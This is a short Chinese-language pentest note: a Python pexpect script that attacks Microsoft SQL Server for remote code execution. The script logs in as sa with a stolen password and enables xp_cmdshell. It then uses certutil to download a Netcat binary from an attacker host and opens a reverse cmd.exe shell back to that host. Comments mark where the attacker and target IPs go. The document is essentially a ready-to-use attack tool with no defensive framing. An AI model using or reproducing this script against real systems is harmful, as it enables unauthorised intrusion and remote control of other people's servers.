---
description: Python / Microsoft SQL Server
---

# ✔️ 编写 SQL Server 漏洞利用程序进行 RCE

## 脚本

* 连接到远程MSSQL数据库并启用`xp_cmdshell`，然后通过上传和执行Netcat二进制文件在目标系统上创建一个反向Shell：

<pre class="language-python"><code class="lang-python">import pexpect
import time

def enable_cmdshell():
    child.sendline("sp_configure 'show advanced options', '1'")
    print("Enabling xp_cmdshell")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    child.sendline("sp_configure 'xp_cmdshell','1'")
    child.expect(confirmation)
    child.sendline("RECONFIGURE")
    spawn_shell()
<strong>
</strong>def spawn_shell():
    print("Upload netcat binary...")
# 按实际情况修改为攻方IP地址
    child.sendline("EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.169.xx.xxx/nc.exe C:/users/public/nc.exe'")   
    print("Spawning shell...")
 # 按实际情况修改为攻方IP地址
    child.sendline("EXEC master..xp_cmdshell 'C:/users/public/nc.exe 192.168.xx.xxx 443 -e cmd.exe'")    
    time.sleep(5)
    print("Closing...")
    child.close()
<strong>
</strong>def connect():
    print("Connecting to remote MSSQL DB...")
    child.expect(pass_prompt)
# 要修改，发送密码
    child.sendline('已获取到的密码')        
    print("Logging in...")
    child.expect(sql_prompt)
    print("Success!")


if __name__ == '__main__':
    sql_prompt = "SQL>"
    confirmation = "to install\."
    pass_prompt = "Password:"
# 按实际目标系统的IP地址修改
    command = "impacket-mssqlclient sa@192.168.xx.xxx"   
    child = pexpect.spawn(command)
    connect()
    enable_cmdshell()
    spawn_shell()

</code></pre>

## MEMO.





